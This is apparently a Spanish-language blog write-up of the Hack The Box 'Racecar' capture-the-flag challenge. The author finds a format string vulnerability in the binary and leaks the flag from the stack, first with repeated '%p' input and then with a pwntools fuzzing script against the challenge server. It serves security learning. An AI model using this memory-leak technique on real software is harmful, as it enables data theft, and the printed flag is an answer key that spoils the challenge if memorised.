---
title: Racecar
description: Did you know that racecar spelled backwards is racecar? Well, now that you know everything about racing, win this race and get the flag!
date: 2024-07-02
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-challenges/pwd_logo.png
categories:
  - Hack The Box
  - Challenges
tags:
  - hack the box
  - pwd
  - format string attack

---
## Information Gathering

```terminal
/home/kali/Documents/htb/challenges/racecar:-$ unzip racecar.zip
racecar
```

Dentro del '.zip', encuentro unicamente un ejecutable 'racecar'.

```terminal
/home/kali/Documents/htb/challenges/racecar:-$ file racecar
racecar: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically 
linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, 
BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped
```

```terminal
/home/kali/Documents/htb/challenges/racecar:-$ ./racecar
```

![](/assets/img/htb-writeup-racecar/racecar1.png)

Basicamente, el juego consiste en eleigr entre las distintas opciones para ganar.

Las opciones ganadoras son el auto 1 y la carrera 2, o el auto 2 y la carrera 1.

Cuando ganas, te permite ingresar caracteres y luego vuelve a imprimirlos.

<https://dogbolt.org/>

![](/assets/img/htb-writeup-racecar/racecar2.png)

Analizando el código, encuentro que es vulnerable a un 'format string attack', como se indica en la línea 577 de 'Ghidra'. 

También requiere un archivo llamado 'flag.txt', como se indica en la línea 566 de 'Ghidra'.

---

## Vulnerability Exploitation

Creé un archivo 'flag.txt' y agregué algunos datos que serían fáciles de identificar en formato hexadecimal, en este caso ‘A’.

```terminal
/home/kali/Documents/htb/challenges/racecar:-$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' > flag.txt
```

Después de hacer esto, volví a correr el ejecutable y esta vez, después de ganar la carrera, pasé '%p' varias veces como dato.

<https://owasp.org/www-community/attacks/Format_string_attack>

```terminal
/home/kali/Documents/htb/challenges/racecar:-$ ./racecar

--------------------------------------------------------
      ______                                       |xxx|
     /|_||_\`.__                                   | F |                                                                             
    (   _    _ _\                                  |xxx|                                                                             
*** =`-(_)--(_)-'                                  | I |                                                                             
                                                   |xxx|                                                                             
                                                   | N |                                                                             
                                                   |xxx|                                                                             
                                                   | I |                                                                             
                                                   |xxx|                                                                             
             _-_-  _/\______\__                    | S |                                                                             
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|                                                                             
            _-_- `( o )----( o )-'                 | H |                                                                             
                   `-'      `-'                    |xxx|                                                                             
--------------------------------------------------------                        
                                                                                                                                     
Insert your data:                                                                                                                    
                                                                                                                                     
Name: name                                                                                                                           
Nickname: nick                                                                                                                  
                                                                                                                                     
[+] Welcome [name]!                                                                                                                  
                                                                                                                                     
[*] Your name is [name] but everybody calls you.. [nick]!                                                                       
[*] Current coins: [69]

1. Car info
2. Car selection
> 2
                                                                                                                                   
Select car:                                                                                                                          
1.
2.
> 2

Select race:                                                                                                                         
1. Highway battle                                                                                                                    
2. Circuit                                                                                                                           
> 1                                                                                                                                  
                                                                                                                                     
[*] Waiting for the race to finish...                                                                                                
                                                                                                                                     
[+] You won the race!! You get 100 coins!                                                                                            
[+] Current coins: [169]                                                                                                             
                                                                                                                                     
[!] Do you have anything to say to the press after your big victory?                       
> %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: 
0x5725b200 0x170 0x56639dfa 0x60 0x6 0x26 0x2 0x1 0x5663a96c 0x5725b200 0x5725b380 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x41414141 0x414141 0x98fb6500 (nil) 0x5663cf8c 0xffb88558
```

Desconozco la posición de la variable que contiene el valor de la bandera en el 'stack', así que llevaré a cabo fuzzing en el 'stack' hasta que logre filtrar la flag.

Y para hacer eso es necesario el siguiente script.


```python
from pwn import *

flag = ''

# Let's fuzz x values
for i in range(100):
    try:
        # Connect to server
        io = remote('83.136.253.251', 42831)
        io.sendlineafter(b'Name: ', b'anas')
        io.sendlineafter(b'Nickname: ', b'something')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'> ', b'1')
        # Format the counter
        # e.g. %i$p will attempt to print [i]th pointer (or string/hex/char/int)
        io.sendlineafter(b'> ', '%{}$p'.format(i).encode())
        # Receive the response
        io.recvline()
        io.recvline()
        result = io.recv()
        if not b'nil' in result:
            print(str(i) + ': ' + str(result))
            try:
                # Decode, reverse endianess and print
                decoded = unhex(result.strip().decode()[2:])
                reversed_hex = decoded[::-1]
                print(str(reversed_hex))
                # Build up flag
                flag += reversed_hex.decode()
            except BaseException:
                pass
    except EOFError:
        pass

# Print and close
info(flag)
io.close()
```

```terminal
/home/kali/Documents/htb/challenges/racecar:-$ python3 exp.py

[+] Opening connection to 94.237.53.113 on port 56321: Done
12: b'0x7b425448\n'
b'HTB{'
[+]
13: b'0x5f796877\n'
b'why_'
[+]
14: b'0x5f643164\n'
b'd1d_'
[+]
15: b'0x34735f31\n'
b'1_s4'
[+] 
16: b'0x745f3376\n'
b'v3_t'
[+]
17: b'0x665f3368\n'
b'h3_f'
[+]
18: b'0x5f67346c\n'
b'l4g_'
[+]
19: b'0x745f6e30\n'
b'0n_t'
[+]
20: b'0x355f3368\n'
b'h3_5'
[+]
21: b'0x6b633474\n'
b't4ck'
[+]
22: b'0x7d213f\n'
b'?!}'
```

HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}

> <a href="https://www.hackthebox.com/achievement/challenge/1521382/242" target="_blank">Racecar Challenge from Hack The Box has been Pwned</a>
{: .prompt-tip }
